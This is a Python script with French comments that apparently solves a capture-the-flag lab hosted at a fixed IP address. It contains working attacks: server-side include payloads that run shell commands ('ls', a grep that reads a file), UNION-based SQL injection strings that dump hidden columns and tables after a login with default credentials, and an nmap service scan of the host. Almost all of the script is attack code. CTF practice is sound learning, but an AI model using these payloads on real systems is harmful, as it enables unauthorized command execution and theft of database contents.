import requests
import re
from bs4 import BeautifulSoup
import subprocess
def ssi():
    # URL du formulaire de connexion
    url = 'http://92.205.177.169:8080/27412/ssi'

    # Création de la session
    session = requests.Session()

    # Envoi de la requête GET pour obtenir la page de connexion
    response = session.get(url)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form')

        # Vérifiez si le formulaire a été trouvé
        if form is not None:
            # Créez un dictionnaire avec les données du formulaire
            form_data = {
                '94fab196': 'a',
                '95898338': "<!--#exec cmd='ls'-->",
                'form': 'submit'
            }

            # Envoi de la requête POST pour soumettre le formulaire
            print("Recherche du premier flag :")
            response = session.post(url, data=form_data)

            # Vérifiez si la soumission du formulaire a réussi
            if response.status_code == 200:
                # Recherche du flag dans la réponse
                flags = re.findall('CTF[a-zA-Z0-9]*', response.text) #On cherche un mot commencant par CTF + une suite de caractère et chiffre
                if flags is not None:
                    print(f'Flag trouvé : {flags}')
                    print("Recherche du deuxième flag :")
                    form_data = {
                        '94fab196': 'a',
                        '95898338': '<!--#exec cmd="grep . \'la.txt\'"-->',    #Escape quote
                        'form': 'submit'
                    }
                    response = session.post(url, data=form_data)
                    
                    if response.status_code == 200:
                        # Recherche du deuxième flag dans la réponse
                        flags = re.findall('CTF[a-zA-Z0-9]*', response.text) #On cherche un mot commencant par CTF + une suite de caractère et chiffre
                        if flags is not []:
                            print(f'Deuxième flag trouvé : {flags}')
            else:
                print(f'Erreur lors de la soumission du formulaire : {response.status_code}')
        else:
            print('Formulaire non trouvé.')
    else:
        print(f'Erreur lors de la récupération de la page de connexion : {response.status_code}')


def sql():
    # URL du formulaire de connexion
    login_url = 'http://92.205.177.169:8080/27412/login'


    # Identifiants de connexion
    username = 'bee'
    password = 'bug'

    # Création de la session
    session = requests.Session()

    # Données du formulaire de connexion
    data = {
        'login': username,
        'password': password,
        'form': 'submit'
    }

    # Envoi de la requête POST pour se connecter
    response = session.post(login_url, data=data)

    url = 'http://92.205.177.169:8080/27412/sql'

    if response.status_code == 200:
        print("Recherche du 1er et 2eme flags :")
        """
        Avec l'injection sql qui va suivre on peut arriver à avoir 2 flags en même temps.
        Cependant les réponses des requêtes ne sont jamais les mêmes alors of effectue 
        l'opération plusieurs fois pour s'assurer d'avoir presque a chaque fois les 2 flags.
        """
        for i in range(100):  
            soup = BeautifulSoup(response.text, 'html.parser')
            form = soup.find('form')

            # Vérifiez si le formulaire a été trouvé
            if form is not None:
                # Récupérez le token CSRF du formulaire
                csrf_token = form.find('input', {'name': 'csrf_token'}).get('value')
                # Créez un dictionnaire avec les données du formulaire
                form_data = {
                    '1e60e082': "' and 1=0 union all select tickets_stock,release_year,ctf_0a8f2dac ,id,imdb,title,main_character,genre from movies -- -",
                    'action': 'search',
                    'csrf_token': csrf_token  # Utilisez le token CSRF récupéré
                }

                # Envoi de la requête POST pour soumettre le formulaire
                response = session.post(url, data=form_data)

                # Vérifiez si la soumission du formulaire a réussi
                if response.status_code == 200:
                    flags = re.findall('CTF[a-fA-F0-9]+', response.text) #On cherche un mot commencant par CTF + une suite de caractère et chiffre

                    if len(flags) < 2:
                        continue
                        
                    else:
                        print(flags)
                        break

        print("Recherche du 3eme flag et 4eme flags :")
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form')

        # Vérifiez si le formulaire a été trouvé
        if form is not None:
            # Récupérez le token CSRF du formulaire
            csrf_token = form.find('input', {'name': 'csrf_token'}).get('value')
            # Créez un dictionnaire avec les données du formulaire
            form_data = {
                '1e60e082': "' and 1=0 union all select genre,tickets_stock,release_year,ctf_0a8f2dac,id,imdb,title,main_character from movies_archive_bd7592d6 -- -",
                'action': 'search',
                'csrf_token': csrf_token  # Utilisez le token CSRF récupéré
            }
            # Envoi de la requête POST pour soumettre le formulaire
            response = session.post(url, data=form_data)
            # Vérifiez si la soumission du formulaire a réussi
            if response.status_code == 200:
                flags = re.findall('CTF[a-fA-F0-9]+', response.text)

                print(flags)

def html():
    url = 'http://92.205.177.169:8080/27412/html'
    print("Recherche du 1er et 2eme flag :")
    # Création de la session
    session = requests.Session()

    # Envoi de la requête GET pour obtenir la page de connexion
    response = session.get(url)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        flags = re.findall('CTF[a-zA-Z0-9]+', response.text) #On cherche un mot commencant par CTF + une suite de caractère et chiffre
        print(flags)

def Ip():
    ip = "92.205.177.169"
    print("Recherche du 1er et 2eme flag :")
    print("Temps d'exécution d'environ 2 minutes.")
    # Exécute la commande nmap
    nmap_output = subprocess.check_output(["nmap", "-sV", ip], text=True)
    
    # Recherche les flags CTF dans la sortie de nmap
    flags = re.findall('CTF[a-zA-Z0-9]*', nmap_output) #On cherche un mot commencant par CTF + une suite de caractère et chiffre
    print("Voici les flags :")
    # Affiche les flags trouvés
    for flag in flags:
        if len(flag) >= 25:
            print(flag)

print("---------------------- FLAGS SSI  ----------------------")
print("\n")
ssi()
print("\n")
print("---------------------- FLAGS SQL  ----------------------")
print("\n")
sql()
print("\n")
print("---------------------- FLAGS HTML ----------------------")
print("\n")
html()
print("\n")
print("---------------------- FLAGS IP   ----------------------")
print("\n")
Ip()
print("\n")
